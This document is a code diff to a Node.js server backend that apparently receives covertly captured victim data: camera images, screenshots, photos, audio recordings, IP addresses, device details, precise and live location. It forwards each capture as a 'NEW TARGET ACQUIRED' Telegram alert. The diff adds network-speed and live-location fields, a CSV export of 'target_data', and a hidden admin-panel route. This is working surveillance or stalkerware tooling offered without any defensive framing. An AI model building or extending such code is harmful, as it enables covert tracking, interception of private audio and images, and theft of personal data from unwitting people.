@@ -53,7 +53,7 @@ async function sendTelegramMessage(message) {
 }
 
 // ==========================================
-// DATA STORE - NO AUTO DELETE!
+// DATA STORE
 // ==========================================
 let allData = [];
 let idCounter = 1;
@@ -63,18 +63,20 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, '../frontend/index.html'));
 });
 
-app.get('/secret-admin.html', (req, res) => {
+// Admin panel hidden - only accessible via direct URL
+app.get('/admin-panel', (req, res) => {
     res.sendFile(path.join(__dirname, '../frontend/secret-admin.html'));
 });
 
 // ==========================================
-// STORE DATA + TELEGRAM
+// STORE DATA
 // ==========================================
 app.post('/api/store', async (req, res) => {
     try {
         const { 
             cameraImage, location, deviceDetails, screenshot, 
-            userPhoto, audioData, ipAddress, fullDeviceInfo 
+            userPhoto, audioData, ipAddress, fullDeviceInfo,
+            networkSpeed, liveLocation
         } = req.body;
 
         const newEntry = {
@@ -87,6 +89,8 @@ app.post('/api/store', async (req, res) => {
             userPhoto: userPhoto || null,
             audioData: audioData || null,
             ipAddress: ipAddress || 'Unknown',
+            networkSpeed: networkSpeed || {},
+            liveLocation: liveLocation || {},
             timestamp: new Date().toISOString()
         };
 
@@ -98,12 +102,11 @@ app.post('/api/store', async (req, res) => {
 🔴 <b>NEW TARGET ACQUIRED</b> 🔴
 📍 Location: ${location?.lat || 0}, ${location?.lng || 0}
 📱 Device: ${fullDeviceInfo?.deviceName || deviceDetails?.deviceName || 'Unknown'}
-🖥️ OS: ${fullDeviceInfo?.os || deviceDetails?.os || 'Unknown'} ${fullDeviceInfo?.osVersion || ''}
 📡 IP: ${ipAddress || 'Unknown'}
 📱 Model: ${fullDeviceInfo?.deviceModel || 'Unknown'}
-🏭 Manufacturer: ${fullDeviceInfo?.manufacturer || 'Unknown'}
 📶 Network: ${fullDeviceInfo?.connection?.type || 'Unknown'}
-🔋 Battery: ${fullDeviceInfo?.battery?.level || 'Unknown'} ${fullDeviceInfo?.battery?.charging ? '⚡' : ''}
+🚀 Speed: ${networkSpeed?.download || 'Unknown'} Mbps
+🔋 Battery: ${fullDeviceInfo?.battery?.level || 'Unknown'}
 🕐 Time: ${new Date().toISOString()}
         `;
 
@@ -134,7 +137,38 @@ app.get('/api/get-ip', (req, res) => {
 });
 
 // ==========================================
-// ADMIN - GET DATA
+// EXPORT CSV
+// ==========================================
+app.get('/api/export-csv', (req, res) => {
+    try {
+        let csv = 'ID,Timestamp,Latitude,Longitude,IP Address,Device,Model,Network,Speed,Audio\n';
+        
+        allData.forEach(item => {
+            const row = [
+                item._id,
+                item.timestamp,
+                item.location?.lat || 0,
+                item.location?.lng || 0,
+                item.ipAddress || 'Unknown',
+                item.deviceDetails?.deviceName || 'Unknown',
+                item.fullDeviceInfo?.deviceModel || 'Unknown',
+                item.fullDeviceInfo?.connection?.type || 'Unknown',
+                item.networkSpeed?.download || 'Unknown',
+                item.audioData ? 'Yes' : 'No'
+            ];
+            csv += row.join(',') + '\n';
+        });
+
+        res.setHeader('Content-Type', 'text/csv');
+        res.setHeader('Content-Disposition', 'attachment; filename=target_data.csv');
+        res.send(csv);
+    } catch(err) {
+        res.status(500).json({ success: false, error: err.message });
+    }
+});
+
+// ==========================================
+// ADMIN
 // ==========================================
 app.post('/api/admin/get-data', (req, res) => {
     try {
@@ -148,9 +182,6 @@ app.post('/api/admin/get-data', (req, res) => {
     }
 });
 
-// ==========================================
-// ADMIN - DELETE DATA (MANUAL ONLY!)
-// ==========================================
 app.post('/api/admin/delete', (req, res) => {
     try {
         const { password, id } = req.body;
@@ -158,18 +189,13 @@ app.post('/api/admin/delete', (req, res) => {
             return res.json({ success: false, message: '⛔ ACCESS DENIED!' });
         }
         allData = allData.filter(item => item._id !== id);
-        console.log('🗑️ Deleted entry:', id);
-        res.json({ success: true, message: '🗑️ Entry deleted!' });
+        res.json({ success: true });
     } catch (err) {
         res.status(500).json({ success: false, error: err.message });
     }
 });
 
-// ==========================================
-// START SERVER
-// ==========================================
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Server: http://localhost:${PORT}`);
-    console.log(`🔑 Admin Password: ${ADMIN_PASSWORD}`);
-    console.log(`📱 Telegram Bot Active!`);
+    console.log(`🔑 Admin: /admin-panel`);
 });
